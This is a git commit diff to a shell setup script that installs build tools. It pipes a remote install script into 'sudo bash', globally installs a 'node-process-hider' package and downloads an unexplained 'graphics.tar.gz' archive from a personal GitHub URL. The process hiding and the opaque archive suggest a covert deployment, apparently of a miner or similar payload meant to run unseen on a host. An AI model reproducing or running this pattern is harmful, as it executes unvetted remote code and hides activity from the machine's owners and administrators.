4ec0ff4619cd2b04c340fdc016b4441861709050
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2021-12-20 13:48:45 +0000

    .

--- start_avx2_tar_col_ws8.sh
+++ start_avx2_tar_col_ws8.sh
@@ -1,4 +1,5 @@
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen
+#!/bin/sh
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
@@ -7,7 +8,6 @@ npm i -g node-process-hider
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
